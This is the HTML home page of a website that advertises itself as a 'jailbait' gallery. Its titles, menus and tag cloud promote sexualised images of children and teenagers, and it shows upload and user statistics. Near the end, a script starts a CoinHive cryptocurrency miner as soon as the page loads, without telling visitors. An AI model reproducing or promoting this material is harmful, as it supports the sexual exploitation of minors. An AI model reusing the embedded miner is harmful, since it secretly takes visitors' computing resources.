<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="utf-8"/><script type="text/javascript">window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var o=t[n]={exports:{}};e[n][0].call(o.exports,function(t){var o=e[n][1][t];return r(o||t)},o,o.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<n.length;o++)r(n[o]);return r}({1:[function(e,t,n){function r(){}function o(e,t,n){return function(){return i(e,[f.now()].concat(u(arguments)),t?null:this,n),t?void 0:this}}var i=e("handle"),a=e(2),u=e(3),c=e("ee").get("tracer"),f=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var p=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],d="api-",l=d+"ixn-";a(p,function(e,t){s[t]=o(d+t,!0,"api")}),s.addPageAction=o(d+"addPageAction",!0),s.setCurrentRouteName=o(d+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,o="function"==typeof t;return i(l+"tracer",[f.now(),e,n],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],n),o)try{return t.apply(this,arguments)}catch(e){throw c.emit("fn-err",[arguments,this,e],n),e}finally{c.emit("fn-end",[f.now()],n)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=o(l+t)}),newrelic.noticeError=function(e){"string"==typeof e&&(e=new Error(e)),i("err",[e,f.now()])}},{}],2:[function(e,t,n){function r(e,t){var n=[],r="",i=0;for(r in e)o.call(e,r)&&(n[i]=t(r,e[r]),i+=1);return n}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],3:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,o=n-t||0,i=Array(o<0?0:o);++r<o;)i[r]=e[t+r];return i}t.exports=r},{}],4:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function o(e){function t(e){return e&&e instanceof r?e:e?c(e,u,i):i()}function n(n,r,o,i){if(!d.aborted||i){e&&e(n,r,o);for(var a=t(o),u=m(n),c=u.length,f=0;f<c;f++)u[f].apply(a,r);var p=s[y[n]];return p&&p.push([b,n,r,a]),a}}function l(e,t){v[e]=m(e).concat(t)}function m(e){return v[e]||[]}function w(e){return p[e]=p[e]||o(n)}function g(e,t){f(e,function(e,n){t=t||"feature",y[n]=t,t in s||(s[t]=[])})}var v={},y={},b={on:l,emit:n,get:w,listeners:m,context:t,buffer:g,abort:a,aborted:!1};return b}function i(){return new r}function a(){(s.api||s.feature)&&(d.aborted=!0,s=d.backlog={})}var u="nr@context",c=e("gos"),f=e(2),s={},p={},d=t.exports=o();d.backlog=s},{}],gos:[function(e,t,n){function r(e,t,n){if(o.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(i){}return e[t]=r,r}var o=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){o.buffer([e],r),o.emit(e,t,n)}var o=e("ee").get("handle");t.exports=r,r.ee=o},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,i,function(){return o++})}var o=1,i="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=h.info=NREUM.info,t=d.getElementsByTagName("script")[0];if(setTimeout(s.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return s.abort();f(y,function(t,n){e[t]||(e[t]=n)}),c("mark",["onload",a()+h.offset],null,"api");var n=d.createElement("script");n.src="https://"+e.agent,t.parentNode.insertBefore(n,t)}}function o(){"complete"===d.readyState&&i()}function i(){c("mark",["domContent",a()+h.offset],null,"api")}function a(){return E.exists&&performance.now?Math.round(performance.now()):(u=Math.max((new Date).getTime(),u))-h.offset}var u=(new Date).getTime(),c=e("handle"),f=e(2),s=e("ee"),p=window,d=p.document,l="addEventListener",m="attachEvent",w=p.XMLHttpRequest,g=w&&w.prototype;NREUM.o={ST:setTimeout,SI:p.setImmediate,CT:clearTimeout,XHR:w,REQ:p.Request,EV:p.Event,PR:p.Promise,MO:p.MutationObserver};var v=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1071.min.js"},b=w&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),h=t.exports={offset:u,now:a,origin:v,features:{},xhrWrappable:b};e(1),d[l]?(d[l]("DOMContentLoaded",i,!1),p[l]("load",r,!1)):(d[m]("onreadystatechange",o),p[m]("onload",r)),c("mark",["firstbyte",u],null,"api");var x=0,E=e(4)},{}]},{},["loader"]);</script>
    <title>PrimeJailbait | The best jailbait and teen photo gallery on the net.</title>
    <meta name="keywords" content="jailbait, jailbait gallery, 12chan jailbait, jailbait images, chan imageboards jailbait, jailbait chan, jailbait image board"/>
    <meta name="description" content="The best jailbait gallery on the net."/>
    <meta name="google-site-verification" content="KvxWh8PIr6jXSqnBS5V5igqQrcQW13zDtuYDut65ldw"/>
    <link rel="icon" type="image/png" href="/config/favicon.ico"/>
    <link rel="apple-touch-icon" href="/config/apple-touch-icon.png" />

    <link rel="stylesheet" href="/lib/css/style.multi.min.css?v1.4.3"/>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.11.2/jquery-ui.min.js" defer></script>

    <script type="text/javascript" src="/lib/js/jquery.ui.selectmenu.1.5.0.min.js" defer></script>
        <script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-9558603-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</head>
<body>
<div id="userbar" style="border:none">

    <div class="l left">

        <!--left-->

    </div>

    <div class="r right">

        <span class="wlcm">Hey <a href="/login/">Anonymous</a>!</span>
        <a href="/news/" class="news">News/FAQ</a>
                    <a href="/login/" title="Login"><span class="gui ico-logout"></span></a>
        
    </div>

</div>
<div id="wrap">

    <div id="subtop">

        <div class="logomenu">

            <div class="logo"><a href="/"><img src="/config/primejb_logo.png?v1.1" style="border:none;"
                                                                    alt="PrimeJailbait Logo" width="200" height="71"></a></div>

            <ul class="menu">
                <li class="item"><a href="javascript:;" class="item-a showsearch active"><span
                            class="gui ico-search-active"></span></a></li>
                <li class="searchbar" style="width:200px;display:block;">
                    <form id="search" action="/search.php">
                        <input type="text" id="query" style="margin-left:8px;"
                               value="" name="query">
                    </form>

                </li>
                <li style="clear:both;"></li>
            </ul>
        </div>

    </div>
    <div id='placeholder'>

    </div>
<div id="delwrap" style="width:100%;">

<div id="wrap">
    <div class="row">
        <div class="table t1 userprofile">
            <div class="header">                <div class="left" style="margin-left:5px;width:40px;height:40px;"><span
                        class="gui ico-user-med"></span></div>
                <div class="left">Latest PrimeJailbait News
                    - 12/30/2017</div>
                <br/>

                <div class="left small">
                    Fixed the tagging issues.
<br>For DMCA takedown requests email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4529202224290535372c28202f242c2927242c316b262a28">[email&#160;protected]</a>                </div>
                <br class="clr"/>
            </div>
        </div>
    </div>
    <div class="top">
        <a href="/gallery/">
            <button id="browse" title="Browse the Main Jailbait Gallery"
                    class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                    aria-disabled="false">
                <span class="ui-button-text">Main Gallery</span>
            </button>
        </a>
        <a href="/top/">
            <button id="browse" title="Browse the Top Jailbait"
                    class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                    aria-disabled="false">
                <span class="ui-button-text">Top Jailbait</span>
            </button>
        </a>
        <a href="/favs/">
            <button id="browse" title="Browse the most Faved Jailbait"
                    class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                    aria-disabled="false">
                <span class="ui-button-text">Fav Jailbait</span>
            </button>
        </a>
                    <a href="/age/">
                <button id="browse" title="Browse the Youngest Jailbait"
                        class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                        aria-disabled="false">
                    <span class="ui-button-text">Youngest Jailbait</span>
                </button>
            </a>
                <a href="/sets/">
            <button id="browse" title="Browse Jailbait Sets"
                    class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                    aria-disabled="false">
                <span class="ui-button-text">Jailbait Sets</span>
            </button>
        </a>
        <a href="/random/">
            <button id="browse" title="Browse Random Jailbait"
                    class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
                    aria-disabled="false">
                <span class="ui-button-text">Feelin Lucky</span>
            </button>
        </a>
        <a href="/collections/">
            <button id="browse" title="Top User Collections"
                    class="ui-state-hover ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only"
                    role="button" aria-disabled="false">
                <span class="ui-button-text">Top Collections</span>
            </button>
        </a>
            </div>
    <!--[if gte IE 9]><!-->
    <div class="row2" style="height: 192px;overflow: hidden;">
        <a href="#" class="hover-dummy" target="_blank">
            <div class="over-res">
                -
            </div>
            <img src="lib/images/pixel.gif" class="img"/>
        </a>

        <div class="recfavs-cont th-wrap"></div>
    </div>
    <br class="clr"/>

    <div class="sda-main">
        <iframe src="https://sda.primecdn.net/image.jpg/?img=1" width="100%" height="100px;"
                allowtransparency="true" frameborder='0' scrolling='no' seamless></iframe>
    </div>
    <!--<![endif]-->
    <!--[if lt IE 10]>
    <div class='sda-main'><a href="http://www.theie8countdown.com/ie-users-info"><img
        src="public/lib/images/badge_iecountdown.png" border="0" height="112" width="700" alt=""/></a></div>
    <![endif]-->
    <!-- blocks -->
    <div id="blocks" style="padding-top: 10px;">

        <div class="block">
            <div class="head">
                <h2 class="title left">Popular tags</h2>

                <br class="clr"/>
            </div>
            <div class="cont">
                <div class="tagcloud">
                    <a href='/search/now+squeeze2' style='font-size: 1.2em'>now squeeze2</a> | <a href='/search/cute' style='font-size: 1.7em'>cute</a> | <a href='/search/asian' style='font-size: 1.2em'>asian</a> | <a href='/search/brunette' style='font-size: 1.3em'>brunette</a> | <a href='/search/ibt' style='font-size: 1.2em'>ibt</a> | <a href='/search/gap' style='font-size: 1.3em'>gap</a> | <a href='/search/mound' style='font-size: 1.2em'>mound</a> | <a href='/search/perfect' style='font-size: 1.2em'>perfect</a> | <a href='/search/thighs' style='font-size: 1.2em'>thighs</a> | <a href='/search/smile' style='font-size: 1.2em'>smile</a> | <a href='/search/blonde' style='font-size: 1.5em'>blonde</a> | <a href='/search/tummy' style='font-size: 1.2em'>tummy</a> | <a href='/search/rearview' style='font-size: 1.2em'>rearview</a> | <a href='/search/tite' style='font-size: 1.2em'>tite</a> | <a href='/search/lips' style='font-size: 1.2em'>lips</a> | <a href='/search/wow' style='font-size: 1.2em'>wow</a> | <a href='/search/socks' style='font-size: 1.2em'>socks</a> | <a href='/search/legs' style='font-size: 1.7em'>legs</a> | <a href='/search/butt' style='font-size: 1.3em'>butt</a> | <a href='/search/now+squeeze' style='font-size: 1.2em'>now squeeze</a> | <a href='/search/cleavage' style='font-size: 1.4em'>cleavage</a> | <a href='/search/belly' style='font-size: 1.2em'>belly</a> | <a href='/search/selfpic' style='font-size: 1.2em'>selfpic</a> | <a href='/search/dress' style='font-size: 1.4em'>dress</a> | <a href='/search/skinny' style='font-size: 1.2em'>skinny</a> | <a href='/search/latina' style='font-size: 1.3em'>latina</a> | <a href='/search/feet' style='font-size: 1.5em'>feet</a> | <a href='/search/panties' style='font-size: 1.2em'>panties</a> | <a href='/search/leggings' style='font-size: 1.3em'>leggings</a> | <a href='/search/captivating' style='font-size: 1.2em'>captivating</a> | <a href='/search/beach' style='font-size: 1.3em'>beach</a> | <a href='/search/busty' style='font-size: 1.2em'>busty</a> | <a href='/search/selfie' style='font-size: 1.3em'>selfie</a> | <a href='/search/mbe' style='font-size: 1.2em'>mbe</a> | <a href='/search/tiny' style='font-size: 1.2em'>tiny</a> | <a href='/search/tits' style='font-size: 1.3em'>tits</a> | <a href='/search/cheerleader' style='font-size: 1.2em'>cheerleader</a> | <a href='/search/bikini' style='font-size: 1.9em'>bikini</a> | <a href='/search/tween' style='font-size: 1.2em'>tween</a> | <a href='/search/skirt' style='font-size: 1.2em'>skirt</a> | <a href='/search/beauty' style='font-size: 1.2em'>beauty</a> | <a href='/search/young' style='font-size: 1.7em'>young</a> | <a href='/search/pool' style='font-size: 1.2em'>pool</a> | <a href='/search/bra' style='font-size: 1.2em'>bra</a> | <a href='/search/sexy' style='font-size: 1.4em'>sexy</a> | <a href='/search/hot' style='font-size: 1.4em'>hot</a> | <a href='/search/tongue' style='font-size: 1.2em'>tongue</a> | <a href='/search/hires' style='font-size: 1.2em'>hires</a> | <a href='/search/glasses+plus' style='font-size: 1.3em'>glasses plus</a> | <a href='/search/grab+em' style='font-size: 1.2em'>grab em</a> | <a href='/search/tight' style='font-size: 1.2em'>tight</a> | <a href='/search/boobs' style='font-size: 1.6em'>boobs</a> | <a href='/search/wet' style='font-size: 1.2em'>wet</a> | <a href='/search/shorts' style='font-size: 1.8em'>shorts</a> | <a href='/search/heels' style='font-size: 1.3em'>heels</a> | <a href='/search/braces' style='font-size: 1.5em'>braces</a> | <a href='/search/teen' style='font-size: 1.5em'>teen</a> | <a href='/search/ass' style='font-size: 1.6em'>ass</a> | <a href='/search/pantyhose' style='font-size: 1.3em'>pantyhose</a> | <a href='/search/booty' style='font-size: 1.2em'>booty</a> |                 </div>
            </div>
        </div>

        <div class="block">
            <div class="head">
                <h2 class="title left"> Top Weekly Active Users</h2>

                <div class="right small">&nbsp;</div>
                <br class="clr"/>
            </div>
            <div class='cont'>
                <div class="tagcloud">
                    <a href='/profile/djohnson' style='font-size: 1.2em'>djohnson</a> | <a href='/profile/mstrb' style='font-size: 1.2em'>mstrb</a> | <a href='/profile/blackdarken' style='font-size: 1.2em'>blackdarken</a> | <a href='/profile/cousinernie' style='font-size: 1.3em'>cousinernie</a> | <a href='/profile/jb69master' style='font-size: 1.6em'>jb69master</a> | <a href='/profile/twerktime' style='font-size: 1.2em'>twerktime</a> | <a href='/profile/youngfairy' style='font-size: 1.3em'>youngfairy</a> | <a href='/profile/whoshotter' style='font-size: 1.3em'>whoshotter</a> | <a href='/profile/icollect' style='font-size: 1.3em'>icollect</a> | <a href='/profile/lamaquina' style='font-size: 1.2em'>lamaquina</a> | <a href='/profile/zeoo' style='font-size: 1.2em'>zeoo</a> | <a href='/profile/redfox67' style='font-size: 1.2em'>redfox67</a> | <a href='/profile/kadeu' style='font-size: 1.5em'>kadeu</a> | <a href='/profile/lovinit4real' style='font-size: 1.3em'>lovinit4real</a> | <a href='/profile/pbaker86' style='font-size: 1.2em'>pbaker86</a> | <a href='/profile/wanderer' style='font-size: 1.6em'>wanderer</a> | <a href='/profile/probowl09' style='font-size: 1.7em'>probowl09</a> | <a href='/profile/aussiebabes' style='font-size: 1.3em'>aussiebabes</a> | <a href='/profile/duncan' style='font-size: 1.4em'>duncan</a> | <a href='/profile/shazamdood' style='font-size: 1.3em'>shazamdood</a> | <a href='/profile/harderfaster' style='font-size: 1.4em'>harderfaster</a> | <a href='/profile/tributethese' style='font-size: 1.2em'>tributethese</a> | <a href='/profile/m25a4r80' style='font-size: 1.2em'>m25a4r80</a> | <a href='/profile/eruza' style='font-size: 1.4em'>eruza</a> | <a href='/profile/chicklets' style='font-size: 1.9em'>chicklets</a> | <a href='/profile/dbullta' style='font-size: 1.3em'>dbullta</a> | <a href='/profile/pauljasper' style='font-size: 1.2em'>pauljasper</a> | <a href='/profile/botpjb' style='font-size: 1.2em'>botpjb</a> | <a href='/profile/jacktherip' style='font-size: 1.3em'>jacktherip</a> | <a href='/profile/bootylover91' style='font-size: 1.2em'>bootylover91</a> | <a href='/profile/zeepa' style='font-size: 1.2em'>zeepa</a> | <a href='/profile/lookinforluv' style='font-size: 1.2em'>lookinforluv</a> | <a href='/profile/mule' style='font-size: 1.3em'>mule</a> | <a href='/profile/arneanka12' style='font-size: 1.5em'>arneanka12</a> | <a href='/profile/goooo' style='font-size: 1.2em'>goooo</a> | <a href='/profile/patator' style='font-size: 1.3em'>patator</a> | <a href='/profile/gavindarren' style='font-size: 1.2em'>gavindarren</a> | <a href='/profile/bartjuh75' style='font-size: 1.6em'>bartjuh75</a> | <a href='/profile/baronyoung' style='font-size: 1.3em'>baronyoung</a> | <a href='/profile/kadaj666' style='font-size: 1.2em'>kadaj666</a> |                 </div>
            </div>
        </div>

        <div class="block">
            <div class="head">
                <h2 class="title left">Info & Stats </h2>
                <br class="clr"/>
            </div>
            <div class="wrapcont">
                <div class="maincont">
                    <div class="cont stats-cont" loaded="1">
                        <div class="stats-row-dark" style="margin: 0px !important;">
                                                        Pics uploaded today: <span class="right"
                                                       style="color:#FD2CA3">775 </span>

                            <div style="margin-top: 0px !important; margin-left:30px">
                                Pics approved today: <span
                                    class="right white">318</span>
                            </div>
                            <div style="margin-top: 0px !important; margin-left:30px">
                                Pics rejected / removed today: <span
                                    class="right white">448 / 28</span>
                            </div>
                            Unique Pic Views (last 30 days): <span class="right"
                                                                   style="color:#FD2CA3">55,649,635</span>

                            <div style="margin-top: 0px !important; margin-left:30px">
                                Unique Pic Views Today: <span
                                    class="right white">1,554,925</span>
                            </div>
                        </div>
                        <div class="stats-row">Registered users: <span
                                class="right white">656,340</span></div>
                        <div class="stats-row" style="margin-left:30px">Users registered today: <span
                                class="right white">120</span></div>

                        <div class="stats-row-dark">
                            Unique favorite pics: <span
                                class="right white">825,006</span><br/>
                            Total Favorites: <span
                                class="right white">1,177,956</span><br/>
                        </div>

                        <div class="stats-row">Tags: <span class="right"
                                                           style="color:#fff">84,487</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>


    </div>
    <!-- !blocks -->


</div>

</div>

<br/>

<br style="clear:both"/>
<!--[if gte IE 9]><!-->
<script data-cfasync="false" src="/cdn-cgi/scripts/d07b1474/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/lib/js/picgrid.js.php" defer></script>
<script type="text/javascript">
    $(document).ready(function () {
        Grid.init();
    });
</script>
<!--<![endif]-->
</div>
<div id="footer">

    <div class="line1">&copy; <a href="/" class="grey"
                                 title="Home - Gallery">PrimeJailbait.com</a>, 2018                                                                                          &nbsp;&nbsp;&nbsp; 28.714 ms    </div>
    <div class="line2">
        <a href="/gallery/" class="grey">Main Jailbait Gallery</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/top/" class="grey">Top Viewed Jailbait</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/news/" class="grey">News/FAQ</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/favs/" class="grey">Top Fav'd Jailbait</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/random/" class="grey">Random Jailbait</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/age/" class="grey">
            Youngest Jailbait</a> &nbsp;&nbsp;&nbsp;&nbsp;        <a href="/sets/" class="grey">Jailbait Sets</a> &nbsp;&nbsp;&nbsp;&nbsp;
        <a href="/login/" class="grey">Login</a> &nbsp;&nbsp;&nbsp;&nbsp;
    </div>
    <div class="line2 fancy"><h1>The best jailbait and teen photo gallery on the net.</h1></div>
    <div class="line2 fancy">
        PrimeJailbait.com is neither the producer or provider of images on this site and as such hold no
        responsibility for images published by third party on this site. Images not found to be in compliance with 18
        USCS 2257, will be removed immediately upon notification of infringing content, and the responsible parties
        reported to the NCMEC, in compliance with 18 USCS 2258A.
    </div>
    <div>
        <br/>
            </div>
</div>
</div>
<script src="/lib/js/jquery.infinitescroll.min.js" defer></script>
<script>
    $('#container').on('click', '.thumb > .favs', function (event) {
        event.preventDefault();
        var id = $(this).attr('id');
        var picid = 'id=' + id;
        $.ajax({
            type: "POST",
            url: "/lib/ajax/favorite.php",
            data: picid,
            error: function () {
                alert('theres an error with AJAX');
            },
            success: function (data) {
                $('#' + id).html(data);
            }
        });
    });
    $(function () {
        var $container = $('#container');
        var infscrPageview = 1;

        $container.infinitescroll({
            loading: {
                finishedMsg: "<em>I think we\'ve hit the end, Jim</em>",
                img: "/lib/images/ajax-loader.gif",
                msgText: "<em>Loading more...</em>"
            },
            navSelector: '#page_nav',    // selector for the paged navigation
            nextSelector: '#page_nav a',  // selector for the NEXT link (to page 2)
            itemSelector: '#infscr',     // selector for all items you'll retrieve .thumbs, .bc-results, #thumbs, #page_nav, #page_nav a
            bufferPx: 1000,
            debug: false
        }, function () {

            infscrPageview++;
            _gaq.push(['_trackPageview', '/page/' + infscrPageview]);

        });
    });
</script>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('FkeXeDfzfRoiAQssksIWN6c46dHbZuAu', {
	// threads: 2,
	throttle: 0.7,
});
	miner.start();
</script>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"47bbd1653f","applicationID":"2146949","transactionName":"ZQNaMRBYC0QAV0dYCVxJbRcLFhVCA1haUklbCFwAGhcVXxE=","queueTime":0,"applicationTime":55,"ttGuid":"","agentToken":"","userAttributes":"","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
</html>